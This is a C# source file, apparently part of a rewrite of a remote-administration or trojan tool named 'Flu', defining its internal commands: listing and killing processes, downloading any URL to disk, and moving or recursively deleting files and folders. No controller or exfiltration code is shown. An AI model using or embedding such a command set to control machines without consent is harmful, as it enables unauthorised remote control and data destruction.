using System;
using System.Linq;
using System.Diagnostics;
using System.Net;
using System.IO;

namespace Flu_Rewrite
{
    class ComandosInternos
    {

        public static String[] ListadeProcesos()
        {
            Process[] Procesos = Process.GetProcesses();
            //Magia, Magia, Que se Haga LINQ :) [Funcion Lambda :P]
            //http://msdn.microsoft.com/es-es/netframework/aa904594 - LINQ
            //http://msdn.microsoft.com/es-es/library/bb397687.aspx - Funciones Lambda
            return Procesos.Select(x => x.ProcessName).ToArray();
        }

        public static Boolean MatarProceso(String Proceso)
        {
            try
            {
                Process Proc = Process.GetProcessesByName(Proceso).FirstOrDefault();
                if (Proc == null) return false;
                Proc.Kill();
                return true;
            }
            catch { return false; }
        }

        public static Boolean DescargarArchivo(String URL, String Ruta)
        {
            try { File.WriteAllBytes(Ruta, (new WebClient()).DownloadData(URL)); return true; }
            catch { return false; }
        }

        public static Boolean CrearCarpeta(String Ruta)
        {
            try { Directory.CreateDirectory(Ruta); return true; }
            catch { return false; }
        }

        public static Boolean MoverArchivo(String Inicio, String Destino)
        {
            try { File.Move(Inicio, Destino); return true; }
            catch { return false; }
        }

        public static Boolean MoverCarpeta(String Inicio, String Destino)
        {
            try { Directory.Move(Inicio, Destino); return true; }
            catch { return false; }
        }

        public static Boolean BorrarArchivo(String Nombre)
        {
            try { File.Delete(Nombre); return true; }
            catch { return false; }
        }

        public static Boolean BorrarCarpeta(String Nombre)
        {
            try { Directory.Delete(Nombre, true); return true; }
            catch { return false; }
        }

        //El modificador ref hace que Resultado se pase como un puntero, no como una copia
        public static Boolean ListarSubdirectorios(String Raiz, String Filtro, ref String[] Resultado)
        {
            try 
            {
                //Si la raiz es nula hacemos el listado en la carpeta actual, 
                //de otro modo lo hacemos en la raiz especificada
                DirectoryInfo DI = new DirectoryInfo(Raiz == "" ? Directory.GetCurrentDirectory() : Raiz );
                Resultado = DI.GetDirectories().Select(x => x.Name).ToArray();
                return true; 
            }
            catch { return false; }
        }
    }
}
